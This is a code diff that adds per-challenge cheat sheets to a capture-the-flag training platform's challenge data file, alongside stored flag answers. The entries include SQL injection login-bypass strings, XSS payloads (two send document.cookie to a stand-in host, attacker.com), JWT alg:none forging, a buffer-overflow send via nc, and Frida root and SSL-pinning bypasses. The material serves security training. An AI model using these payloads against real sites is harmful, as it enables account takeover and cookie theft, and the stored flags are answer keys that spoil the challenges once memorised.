@@ -22,6 +22,12 @@ export const challenges = [
       { id: 1, text: "Classic SQL injection starts with a single quote. What happens when you add one to the username field?", cost: 10 },
       { id: 2, text: "Try the payload: admin'-- in the username field with any password.", cost: 20 },
     ],
+    cheatsheet: [
+      { command: "admin' OR '1'='1' --", description: "Basic authentication bypass payload", category: "SQLi" },
+      { command: "admin'--", description: "Comment out the rest of the query", category: "SQLi" },
+      { command: "SELECT * FROM users WHERE username='admin' AND password='...'", description: "The vulnerable query behind the login form", category: "Concept" },
+      { command: "' OR 1=1 LIMIT 1;--", description: "Force login as the first user in the table", category: "SQLi" },
+    ],
     files: [],
     connectionInfo: null,
     createdAt: '2026-01-15',
@@ -50,6 +56,13 @@ export const challenges = [
     hints: [
       { id: 1, text: "Look closely at the application's session management mechanism.", cost: 20 },
       { id: 2, text: "Not everything visible in the UI is what it seems. Inspect your browser's storage.", cost: 30 },
+    ],
+    cheatsheet: [
+      { command: "curl -i http://web-fortress.challenge.local:8080", description: "Inspect response headers and cookies", category: "Recon" },
+      { command: "curl -c cookies.txt -b cookies.txt -L http://...", description: "Persist cookies between requests", category: "Recon" },
+      { command: "document.cookie", description: "Read cookies in the browser console", category: "Cookies" },
+      { command: "localStorage.setItem('isAdmin','true')", description: "Manipulate browser storage for client-side checks", category: "Cookies" },
+      { command: "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt", description: "Enumerate hidden directories", category: "Enumeration" },
     ],
     files: [
       { name: 'source-code.zip', size: '42 KB', type: 'zip' },
@@ -82,6 +95,12 @@ export const challenges = [
     hints: [
       { id: 1, text: "The flag format is CTF{}. Count how many letters apart W is from C.", cost: 5 },
     ],
+    cheatsheet: [
+      { command: "python3 -c \"import string; s='WTY{...}'; print(''.join(chr((ord(c)-ord('A')-3)%26+ord('A')) if c.isupper() else c for c in s))\"", description: "Brute-force Caesar shift in Python", category: "Caesar" },
+      { command: "tr 'A-Za-z' 'D-ZA-Cd-za-c' < ciphertext.txt", description: "Apply ROT3 using tr (Linux)", category: "Caesar" },
+      { command: "https://www.dcode.fr/caesar-cipher", description: "Online Caesar cipher solver", category: "Tools" },
+      { command: "python3 -c \"import string; all_shifts = [''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else c for c in s) for i in range(26)]\"", description: "Print all 26 possible shifts", category: "Caesar" },
+    ],
     files: [
       { name: 'ciphertext.txt', size: '1 KB', type: 'txt' },
     ],
@@ -112,6 +131,13 @@ export const challenges = [
     hints: [
       { id: 1, text: "When p and q are too close together, Fermat's factorization method is very effective.", cost: 40 },
       { id: 2, text: "The difference between p and q is less than 1000. Use Fermat's method.", cost: 60 },
+    ],
+    cheatsheet: [
+      { command: "openssl rsa -in key.pem -text -noout", description: "Dump RSA key parameters including n, e, d", category: "RSA" },
+      { command: "python3 -c \"import gmpy2; p=gmpy2.isqrt(n); ...; print(p)\"", description: "Fermat factorization: start from sqrt(n) and search", category: "RSA" },
+      { command: "python3 -c \"m = pow(c, d, n); print(bytes.fromhex(format(m,'x')).decode())\"", description: "Decrypt ciphertext with known private exponent", category: "RSA" },
+      { command: "sage -c \"factor(n)\"", description: "Use SageMath for advanced factoring", category: "Tools" },
+      { command: "https://www.alpertron.com.ar/ECM.HTM", description: "Online integer factorization tool", category: "Tools" },
     ],
     files: [
       { name: 'challenge.py', size: '3 KB', type: 'python' },
@@ -145,6 +171,14 @@ export const challenges = [
       { id: 1, text: "Use `strings` on the binary first. Sometimes passwords are stored in plaintext.", cost: 25 },
       { id: 2, text: "The comparison function in the binary is vulnerable to a timing attack.", cost: 40 },
     ],
+    cheatsheet: [
+      { command: "strings whisper | grep -i secret", description: "Extract printable strings, filter for interesting content", category: "Static Analysis" },
+      { command: "strings -n 6 whisper", description: "Show strings with minimum length 6", category: "Static Analysis" },
+      { command: "file whisper", description: "Determine the binary file type", category: "Analysis" },
+      { command: "objdump -d whisper", description: "Disassemble the binary", category: "Disassembly" },
+      { command: "ghidra whisper", description: "Open in Ghidra for interactive reverse engineering", category: "Disassembly" },
+      { command: "ltrace ./whisper", description: "Trace library calls at runtime", category: "Dynamic Analysis" },
+    ],
     files: [
       { name: 'whisper', size: '18 KB', type: 'binary' },
     ],
@@ -174,6 +208,13 @@ export const challenges = [
     flag: 'CTF{k3yg3n_m4st3r_unlocked}',
     hints: [
       { id: 1, text: "The key has a specific pattern. Look at the ASCII values being compared.", cost: 15 },
+    ],
+    cheatsheet: [
+      { command: "jadx crackme0.exe", description: "Decompile Java-based binaries", category: "Analysis" },
+      { command: "rabin2 -z crackme0.exe", description: "Show strings in binary (radare2)", category: "Culture" },
+      { command: "r2 -A crackme0.exe", description: "Open in radare2 with full analysis", category: "Disassembly" },
+      { command: "strings crackme0.exe | grep -i 'key\\|flag'", description: "Search for key/flag hints in strings", category: "Static Analysis" },
+      { command: "python3 -c \"print(''.join(chr(int(x)) for x in '83 84 6F...'.split()))\"", description: "Decode ASCII values found in the binary", category: "Crypto" },
     ],
     files: [
       { name: 'crackme0.exe', size: '12 KB', type: 'binary' },
@@ -206,6 +247,13 @@ export const challenges = [
       { id: 1, text: "Use Volatility's `strings` plugin and grep for CTF{", cost: 25 },
       { id: 2, text: "The flag was stored in a notepad.exe process. Check the memory regions of that PID.", cost: 40 },
     ],
+    cheatsheet: [
+      { command: "volatility -f memdump.raw imageinfo", description: "Identify the profile/OS of the memory dump", category: "Volatility" },
+      { command: "volatility -f memdump.raw --profile=Win7SP1x64 pslist", description: "List running processes", category: "Volatility" },
+      { command: "volatility -f memdump.raw --profile=Win7SP1x64 strings | grep 'CTF{'", description: "Grep all memory strings for the flag", category: "Volatility" },
+      { command: "volatility -f memdump.raw --profile=Win7SP1x64 memdump -p <PID> -D out/", description: "Dump a process memory region for analysis", category: "Volatility" },
+      { command: "foremost -i memdump.raw -o extracted/", description: "Carve embedded files out of the dump", category: "Carving" },
+    ],
     files: [
       { name: 'memdump.zip', size: '256 MB', type: 'zip' },
       { name: 'analysis-notes.txt', size: '3 KB', type: 'txt' },
@@ -236,6 +284,13 @@ export const challenges = [
     flag: 'CTF{p4ck3t_sn1ff3r_pr0}',
     hints: [
       { id: 1, text: "Filter for HTTP traffic. The flag was sent in an HTTP POST request body.", cost: 10 },
+    ],
+    cheatsheet: [
+      { command: "wireshark capture.pcap", description: "Open PCAP in Wireshark GUI", category: "Wireshark" },
+      { command: "tshark -r capture.pcap -Y 'http.request' -T fields -e http.request.uri", description: "List all HTTP request URIs", category: "CLI" },
+      { command: "tshark -r capture.pcap -Y http -T fields -e http.request.method -e http.request.uri -e http.request.body", description: "Show method, URI, and body of HTTP requests", category: "CLI" },
+      { command: "tshark -r capture.pcap -z follow,tcp,raw,1", description: "Follow TCP stream #1 and display raw data", category: "CLI" },
+      { command: "strings capture.pcap | grep -i 'CTF{\\|flag\\|password'", description: "Quick grep for interesting data", category: "Quick Wins" },
     ],
     files: [
       { name: 'capture.pcap', size: '4.2 MB', type: 'pcap' },
@@ -268,6 +323,14 @@ export const challenges = [
       { id: 1, text: "Try running `exiftool` on the image first to check metadata.", cost: 10 },
       { id: 2, text: "The flag is hidden using LSB steganography. Try steghide or stegsolve.", cost: 20 },
     ],
+    cheatsheet: [
+      { command: "exiftool innocent.png", description: "Check image metadata for hidden messages", category: "Metadata" },
+      { command: "binwalk innocent.png", description: "Scan for embedded files inside the image", category: "Analysis" },
+      { command: "steghide extract -sf innocent.png", description: "Extract hidden data (asks for passphrase)", category: "Steganography" },
+      { command: "zsteg innocent.png", description: "Detect LSB steganography in PNG/BMP", category: "Steganography" },
+      { command: "python3 -c \"from PIL import Image; img=Image.open('innocent.png'); ...\"", description: "Extract LSB bits manually with PIL", category: "Steganography" },
+      { command: "stegsolve innocent.png", description: "Cyclically view bit planes to spot hidden data", category: "Steganography" },
+    ],
     files: [
       { name: 'innocent.png', size: '1.8 MB', type: 'png' },
     ],
@@ -299,6 +362,13 @@ export const challenges = [
       { id: 1, text: "The username is consistent across GitHub, Twitter, and Pastebin.", cost: 20 },
       { id: 2, text: "Check the GitHub bio and pinned repositories for clues.", cost: 30 },
     ],
+    cheatsheet: [
+      { command: "https://github.com/shadow_op_77", description: "Check GitHub profile, repos, and commit history", category: "Social Media" },
+      { command: "https://twitter.com/shadow_op_77", description: "Search Twitter/X for the username and mentions", category: "Social Media" },
+      { command: "site:pastebin.com shadow_op_77", description: "Google dork for Pastebin dumps by that user", category: "Google Dorking" },
+      { command: "https://namechk.com", description: "Check username availability across 100+ platforms", category: "OSINT Tools" },
+      { command: "theHarvester -d shadow_op_77 -b google | twitter | linkedin", description: "Automated OSINT email/host harvesting", category: "OSINT Tools" },
+    ],
     files: [],
     connectionInfo: null,
     createdAt: '2026-02-20',
@@ -327,6 +397,14 @@ export const challenges = [
     hints: [
       { id: 1, text: "Use a cyclic pattern to find the exact offset before the return address.", cost: 35 },
       { id: 2, text: "The buffer is 64 bytes. The return address is at offset 72.", cost: 50 },
+    ],
+    cheatsheet: [
+      { command: "checksec --file=./vuln", description: "Check binary protections (NX, PIE, canary, RELRO)", category: "Analysis" },
+      { command: "gdb-peda vuln", description: "Debug the binary with GDB + PEDA", category: "Exploitation" },
+      { command: "python3 -c \"import pwnlib; print(pwnlib.util.cyclic(100))\"", description: "Generate a cyclic pattern to find the offset", category: "Exploitation" },
+      { command: "python3 -c \"import pwnlib; print(pwnlib.util.cyclic_find('aaaab'))\"", description: "Find the exact offset from the cyc pattern", category: "Exploitation" },
+      { command: "echo 'AAAA...' | nc bof.challenge.local 4444", description: "Send a payload to the remote service", category: "Exploitation" },
+      { command: "objdump -d vuln | grep win", description: "Locate the win() function address", category: "Disassembly" },
     ],
     files: [
       { name: 'vuln', size: '8 KB', type: 'binary' },
@@ -360,6 +438,14 @@ export const challenges = [
       { id: 1, text: "Decode your JWT and look carefully at the algorithm field in the header.", cost: 20 },
       { id: 2, text: "Try setting alg to 'none' and removing the signature portion.", cost: 35 },
     ],
+    cheatsheet: [
+      { command: "https://jwt.io", description: "Decode/inspect JWT tokens online", category: "Tools" },
+      { command: "python3 -c \"import base64,json; h=base64.urlsafe_b64decode(header+'==').decode(); print(h)\"", description: "Decode the JWT header manually", category: "Decoding" },
+      { command: "python3 -c \"import base64; print(base64.urlsafe_b64decode(payload).decode())\"", description: "Decode the JWT payload manually", category: "Decoding" },
+      { command: "{'alg': 'none', 'typ': 'JWT'} + '.eyJ...' + '.'", description: "alg:none attack - strip the signature", category: "Attacks" },
+      { command: "john --format=HMAC-SHA256 jwt.txt", description: "Brute-force weak HMAC secrets with John", category: "Attack" },
+      { command: "python3 -m pip install pyjwt", description: "Install PyJWT for token forging scripts", category: "Tools" },
+    ],
     files: [],
     connectionInfo: { url: 'http://jwt-app.challenge.local', port: 3000 },
     createdAt: '2026-03-05',
@@ -387,6 +473,14 @@ export const challenges = [
     flag: 'CTF{x55_c00k13_th13f}',
     hints: [
       { id: 1, text: "The comment field is vulnerable. Try a simple <script>alert(1)</script> first.", cost: 10 },
+    ],
+    cheatsheet: [
+      { command: "<script>alert(1)</script>", description: "Simple XSS proof-of-concept", category: "Payloads" },
+      { command: "<img src=x onerror=alert(1)>", description: "Image-based XSS payload that fires when tag fails", category: "Payloads" },
+      { command: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>", description: "Steal cookies by exfiltrating to attacker server", category: "Cookie Theft" },
+      { command: "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>", description: "Cookie exfiltration via image request", category: "Cookie Theft" },
+      { command: "<svg/onload=alert(document.domain)>", description: "SVG-based XSS without script tag", category: "Payloads" },
+      { command: "python3 -m http.server 8080", description: "Host a listener to catch exfiltrated data", category: "Setup" },
     ],
     files: [],
     connectionInfo: { url: 'http://xss-blog.challenge.local', port: 8000 },
@@ -416,6 +510,14 @@ export const challenges = [
     hints: [
       { id: 1, text: "The ioctl handler is missing proper locking. Race conditions are possible.", cost: 75 },
       { id: 2, text: "Use a spray technique to control the freed memory region before re-allocation.", cost: 100 },
+    ],
+    cheatsheet: [
+      { command: "uname -r", description: "Check the running kernel version", category: "Recon" },
+      { command: "cat /proc/modules | grep vuln", description: "Verify the vulnerable module is loaded", category: "Recon" },
+      { command: "ls -la /dev/vuln_dev", description: "Check the device node permissions", category: "Recon" },
+      { command: "gcc -o exploit exploit.c", description: "Compile the local exploit", category: "Development" },
+      { command: "sudo -l", description: "Check sudo permissions for quick win", category: "PrivEsc" },
+      { command: "cat /root/flag.txt", description: "Read the flag after successful escalation", category: "Flag" },
     ],
     files: [
       { name: 'vuln_module.c', size: '8 KB', type: 'c' },
@@ -449,6 +551,14 @@ export const challenges = [
     hints: [
       { id: 1, text: "Start with base64 decoding. The result will hint at the next encoding step.", cost: 5 },
     ],
+    cheatsheet: [
+      { command: "echo 'encoded_string' | base64 -d", description: "Decode base64 (Linux)", category: "Base64" },
+      { command: "python3 -c \"import base64; print(base64.b64decode(s).decode())\"", description: "Decode base64 with Python", category: "Base64" },
+      { command: "echo 'string' | tr 'A-Za-z' 'N-ZA-Mn-za-m'", description: "Apply ROT13", category: "ROT13" },
+      { command: "echo 'string' | xxd -r -p", description: "Convert hex to ASCII", category: "Hex" },
+      { command: "echo '5f0101' | xxd -r -p", description: "Convert binary/hex strings", category: "Hex" },
+      { command: "python3 -c \"import urllib.parse; print(urllib.parse.unquote(s))\"", description: "URL-decode a percent-encoded string", category: "URL Encoding" },
+    ],
     files: [
       { name: 'encoded_message.txt', size: '1 KB', type: 'txt' },
     ],
@@ -479,6 +589,13 @@ export const challenges = [
     hints: [
       { id: 1, text: "Filter for DNS queries to the domain exfil.evil.io. Extract all subdomains.", cost: 20 },
       { id: 2, text: "Concatenate all subdomain labels and base64 decode the result.", cost: 30 },
+    ],
+    cheatsheet: [
+      { command: "tshark -r corporate_traffic.pcap -Y 'dns.qry.name contains exfil.evil.io' -T fields -e dns.qry.name", description: "Extract all DNS queries to the tunnel domain", category: "DNS" },
+      { command: "tshark -r corporate_traffic.pcap -Y dns -T fields -e dns.qry.name | sort -u", description: "List unique DNS query names", category: "DNS" },
+      { command: "python3 -c \"import base64; print(base64.b64decode(''.join(chunks)+'==').decode())\"", description: "Decode concatenated base64 subdomain labels", category: "Decoding" },
+      { command: "tshark -r corporate_traffic.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name", description: "Filter to only DNS queries (not responses)", category: "DNS" },
+      { command: "grep -oP '([a-z0-9]+)\\.exfil\\.evil\\.io' dns.txt | cut -d. -f1", description: "Extract only the label portion from each query", category: "Parsing" },
     ],
     files: [
       { name: 'corporate_traffic.pcap', size: '18 MB', type: 'pcap' },
@@ -512,6 +629,14 @@ export const challenges = [
       { id: 1, text: "Use jadx to decompile the APK. Look for the checkRoot() method in the MainActivity.", cost: 40 },
       { id: 2, text: "Use a Frida script to hook the SSL library's certificate verification function.", cost: 60 },
     ],
+    cheatsheet: [
+      { command: "jadx SecureBank.apk -d decompiled/", description: "Decompile APK to Java source code", category: "Static Analysis" },
+      { command: "frida -U -f com.securebank -l root_bypass.js --no-pause", description: "Attach Frida with a root bypass script", category: "Frida" },
+      { command: "objection -g com.securebank explore", description: "Use objection for runtime Android exploration", category: "Frida" },
+      { command: "frida -U -f com.securebank -l sslpinning_bypass.js --no-pause", description: "Bypass SSL certificate pinning", category: "SSL Pinning" },
+      { command: "adb shell am start -n com.securebank/.MainActivity", description: "Launch the app on Android emulator", category: "Emulator" },
+      { command: "aapt dump badging SecureBank.apk | head -20", description: "Dump APK package info and permissions", category: "Static Analysis" },
+    ],
     files: [
       { name: 'SecureBank.apk', size: '8.4 MB', type: 'apk' },
       { name: 'frida-hints.txt', size: '2 KB', type: 'txt' },
@@ -540,6 +665,9 @@ export const challenges = [
     solved: false,
     flag: 'CTF{w3lc0m3_t0_cyb3rf0rg3}',
     hints: [],
+    cheatsheet: [
+      { command: "CTF{w3lc0m3_t0_cyb3rf0rg3}", description: "The flag is visible in the challenge description itself", category: "Flag" },
+    ],
     files: [],
     connectionInfo: null,
     createdAt: '2026-01-10',
@@ -565,6 +693,9 @@ export const challenges = [
     solved: false,
     flag: 'CTF{tr14l_gr0und_0p3n}',
     hints: [],
+    cheatsheet: [
+      { command: "CTF{tr14l_gr0und_0p3n}", description: "Example flag for this practice challenge", category: "Flag" },
+    ],
     files: [],
     connectionInfo: null,
     createdAt: '2026-09-13',
